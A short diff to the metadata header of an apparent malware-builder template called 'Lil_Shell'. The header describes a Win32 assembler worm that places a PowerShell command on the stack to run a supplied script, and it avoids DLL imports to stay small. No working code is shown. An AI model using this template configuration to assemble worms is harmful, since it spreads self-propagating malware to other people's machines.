@@ -1,6 +1,6 @@
 #!name##Lil_Shell
 #!types##worm
-#!info##A simple assembler worm. Runs a powershell script. Places the code on the stack. It does not include DLL libraries in the executable file which makes it very small.
+#!info##A simple assembler worm (win32). Runs a powershell script. Places the code on the stack. It does not include DLL libraries in the executable file which makes it very small.
 #!reqPayload##LIL_pscript##PowerShell script to execute##STACK_BUILD:True##STACK_COMMAND:powershell.exe -Command "$"
 #!lang##asm
 #!banned##module##starter##shadow##junk
